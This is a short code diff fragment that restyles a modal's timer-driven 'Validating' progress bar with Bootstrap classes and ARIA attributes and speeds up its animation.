-                 <div id="progressFill" style="background: #4caf50; width: 0%; height: 100%; border-radius: 5px;"></div>
-               </div>`,
+        html: `
+          <div id="progressText" class="mb-2">Validating: <b>0%</b></div>
+          <div class="progress">
+            <div id="progressFill" class="progress-bar bg-success" role="progressbar" style="width: 0%;" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100"></div>
+          </div>
+        `,
         allowOutsideClick: false,
         showConfirmButton: false,
         didOpen: () => {
@@ -693,13 +759,14 @@
           const progressFill = document.getElementById('progressFill');
           const interval = setInterval(() => {
             if (progress < 100) {
-              progress += 1;
+              progress += 2;
               progressText.innerHTML = `Validating: <b>${progress}%</b>`;
               progressFill.style.width = `${progress}%`;
+              progressFill.setAttribute('aria-valuenow', progress);
             } else {
               clearInterval(interval);
             }
-          }, 80);
+          }, 50);
         },
       });
     }
